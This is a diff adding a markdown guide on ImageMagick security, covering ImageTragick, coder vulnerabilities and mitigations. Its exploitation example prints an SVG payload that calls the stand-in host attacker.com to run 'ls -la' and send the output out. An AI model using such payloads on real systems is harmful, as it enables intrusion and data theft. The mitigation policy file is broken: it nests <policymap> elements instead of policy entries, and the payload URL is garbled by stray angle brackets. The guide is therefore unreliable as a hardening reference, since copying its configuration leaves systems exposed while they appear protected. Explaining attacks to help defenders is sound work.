@@ -1,0 +1,92 @@
+# ImageMagick Security
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> ImageMagick is a powerful tool used for displaying, converting, and editing raster image and vector image files. It includes a number of command-line utilities for manipulating images. However, it has been found to have significant security vulnerabilities that could be exploited by attackers to execute arbitrary code or cause denial of service.
+> 
+
+### 🧐 Why ?
+
+> Security in ImageMagick is important because it is widely used in web services to process images. Its vulnerabilities can expose these services to attacks, leading to sensitive data breaches, unauthorized system access, and disruption of services. Understanding ImageMagick security helps administrators and developers to secure their systems and applications.
+> 
+
+### ⛏️ How ?
+
+> Securing ImageMagick involves keeping it up-to-date with the latest patches that fix known vulnerabilities. It is also important to limit the capabilities of ImageMagick to only what's necessary for your application, disable coders that are not needed, and use secure coding practices to avoid introducing new vulnerabilities. In addition, using security controls like firewalls and intrusion detection systems can help detect and prevent attacks.
+> 
+
+### ⏳ When ?
+
+> Security issues in ImageMagick started gaining attention around 2016 when a serious vulnerability, known as 'ImageTragick', was discovered. This led to a renewed focus on securing ImageMagick and the development of more secure alternatives.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+ImageMagick is a widely utilized tool for displaying, converting, and editing images in both raster and vector formats. It's particularly useful because of its command-line utilities that allow for a wide range of image manipulation tasks. However, its usage also opens up potential security risks due to vulnerabilities inherent to the software.
+
+Each image format that ImageMagick handles has its own set of encoders and decoders, referred to as "coders". These coders, unfortunately, can have their own set of vulnerabilities. These weaknesses can be exploited by an attacker to overflow the system's buffer, inject malicious code, or cause other types of damage.
+
+Buffer overflow, for instance, occurs when more data is written into a block of memory, or buffer, than it can hold. This can corrupt data, crash the program, or in the worst cases, allow attackers to execute arbitrary code.
+
+Code injection is another threat where an attacker introduces (or "injects") code into a vulnerable computer program, changing its course of execution. This can lead to serious repercussions like data loss, security breach, or even system takeover.
+
+To mitigate these risks, it's crucial to limit the coders that ImageMagick uses to only those that are necessary for your specific application. This reduces the potential entry points for an attacker. Regularly updating ImageMagick is another essential step as patches are often released to fix known vulnerabilities.
+
+Furthermore, secure coding practices can also harden your system against attacks. These might include techniques such as input validation, error handling, and code reviews. All of these combined can significantly strengthen the security of systems using ImageMagick.
+
+Additionally, using security controls like firewalls and intrusion detection systems can help detect and prevent attacks. These tools provide an extra layer of security by blocking unauthorized access and alerting you to any potential attacks.
+
+Finally, it's worth noting that security concerns with ImageMagick began to gain significant attention around 2016 with the discovery of a serious vulnerability termed 'ImageTragick'. This led to a renewed focus on securing ImageMagick and spurred the development of more secure alternatives.
+
+As an example of how an ImageMagick vulnerability could be exploited and mitigated, consider the following scenario:
+
+1. **Exploitation:**
+Suppose we have an image upload feature on a website that uses ImageMagick to process uploaded images. An attacker could potentially exploit a vulnerability in one of ImageMagick's coders by crafting a malicious image file.
+    
+    ```bash
+    convert evil.svg output.png
+    
+    ```
+    
+    In this command, `evil.svg` is a specially crafted SVG file that exploits a vulnerability in ImageMagick's SVG coder, and `convert` is one of ImageMagick's command-line utilities.
+    
+    The SVG file might contain a payload like this:
+    
+    ```xml
+    <svg xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>">
+        <image xlink:href="<https://attacker.com/collect.php?data=|ls> -la|" x="0" y="0" height="100px" width="100px"/>
+    </svg>
+    
+    ```
+    
+    In this payload, `ls -la` is a command that lists all files in the current directory, and `https://attacker.com/collect.php?data=` is a URL that the attacker controls. When ImageMagick processes this SVG file, it could execute the `ls -la` command and send the output to the attacker.
+    
+2. **Mitigation:**
+To mitigate this vulnerability, we can limit the coders that ImageMagick uses to only those that are necessary for our application. For example, if our application only needs to process PNG and JPEG images, we can disable all other coders in the ImageMagick policy configuration file:
+    
+    ```xml
+    <policymap>
+        <policymap domain="coder" rights="none" pattern="*"/>
+        <policymap domain="coder" rights="all" pattern="PNG,JPEG"/>
+    </policymap>
+    
+    ```
+    
+    In this configuration, the first line disables all coders, and the second line enables only the PNG and JPEG coders.
+    
+    Additionally, we should keep ImageMagick up-to-date to ensure that we have the latest security patches:
+    
+    ```bash
+    sudo apt update && sudo apt upgrade imagemagick
+    
+    ```
+    
+    This command updates the package list and upgrades the ImageMagick package on a system using the apt package manager.
+    
